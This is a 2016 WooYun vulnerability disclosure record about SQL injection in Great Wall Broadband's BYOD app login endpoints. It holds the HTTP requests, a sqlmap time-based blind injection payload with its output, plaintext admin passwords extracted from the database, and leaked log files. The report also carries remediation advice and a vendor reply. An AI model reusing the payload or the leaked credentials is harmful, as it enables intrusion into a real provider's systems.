{"id": 86958, "wybug_id": "wooyun-2016-0191969", "wybug_title": "长城宽带连锁反应多处APP注入等导致BYOD系统登录(详细宽带信息)", "wybug_corp": "长城宽带", "wybug_author": "jianFen", "wybug_date": "2016-04-03 14:30", "wybug_open_date": "2016-05-21 14:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["后台被猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-21：\t细节向公众公开  简要描述： 如何进行有效连锁 详细说明：  西安长城宽带：http://\n\nmask 区域\n******.*******\n\nindex.php/payrecord/下载APP：\n\nmask 区域\n******.*******\n\ndownload/cckd.apk\nPOST /xack/index.php/login/user_login HTTP/1.1Content-Length: 105Content-Type: text/plain; charset=UTF-8Host: \n\nmask 区域\n\n*****.*******\n\n\n\nConnection: Keep-Alive{\"localMac\":\"a4:3d:78:a0:3d:da\",\"curr_version\":\"0\",\"mac_addr\":\"1*\",\"wk_password\":\"e\",\"login_type\":\"wk_no\"}\n#1注入:\nsqlmap identified the following injection point(s) with a total of 169 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: {\"localMac\":\"a4:3d:78:a0:3d:da\",\"curr_version\":\"0\",\"mac_addr\":\"11' AND (SELECT * FROM (SELECT(SLEEP(5)))fhLF) AND 'Qxuc'='Qxuc\",\"wk_password\":\"eeee\",\"login_type\":\"wk_no\"}---web application technology: PHP 5.3.3back-end DBMS: MySQL 5.0.12sqlmap resumed the following injection point(s) from stored session:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: {\"localMac\":\"a4:3d:78:a0:3d:da\",\"curr_version\":\"0\",\"mac_addr\":\"11' AND (SELECT * FROM (SELECT(SLEEP(5)))fhLF) AND 'Qxuc'='Qxuc\",\"wk_password\":\"eeee\",\"login_type\":\"wk_no\"}---web application technology: PHP 5.3.3back-end DBMS: MySQL >= 5.0.0sqlmap resumed the following injection point(s) from stored session:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: {\"localMac\":\"a4:3d:78:a0:3d:da\",\"curr_version\":\"0\",\"mac_addr\":\"11' AND (SELECT * FROM (SELECT(SLEEP(5)))fhLF) AND 'Qxuc'='Qxuc\",\"wk_password\":\"eeee\",\"login_type\":\"wk_no\"}---web application technology: PHP 5.3.3back-end DBMS: MySQL >= 5.0.0Database: xackTable: t_user--sql-shellselect password from t_user where user_name = 'admin'; #直接获取明文admin密码admin/byod@xa\n使用admin/byod@xa直接登录http://\n\nmask 区域\n******.*******\n\n\n\n\n\n#2深圳长城宽带http://\n\nmask 区域\n******.*******\n\napp下载：http://\n\nmask 区域\n******.*******\n\ndownload/cckd.apk\nPOST /szck/index.php/login/user_login HTTP/1.1Content-Length: 105Content-Type: text/plain; charset=UTF-8Host: \n\nmask 区域\n\n*****.*******\n\n\n\nConnection: Keep-Alive{\"real_mac\":\"a4:3d:78:a0:3d:da\",\"curr_version\":\"0\",\"mac_addr\":\"1\",\"wk_password\":\"d\",\"login_type\":\"wk_no\"}\n\nselect password from t_user where user_name = 'admin'; [1]:[*] szbyodytsm\n直接登录admin/szbyodytsmhttp://\n\nmask 区域\n******.*******\n\n\n\n#3log.txt文件泄露 http://\n\nmask 区域\n*****.*******\n\n/szck/log.txthttp://\n\nmask 区域\n*****.*******\n\n/xack/log.txt可搜出账号密码登录日志:\n\n   漏洞证明：  包含内容\n\n   修复方案：  1.BYOD系统直接连接BOSS系统 能直接影响订单所以要保护好2.APP注入修复3.目录log泄露4.存在111111/123456等纯数字弱口令修复整改   版权声明：转载请注明来源 jianFen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-04-06 13:58 厂商回复： CNVD未直接复现所述情况，已由CNVD通过网站管理方公开联系渠道向其邮件通报，由其后续提供解决方案。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}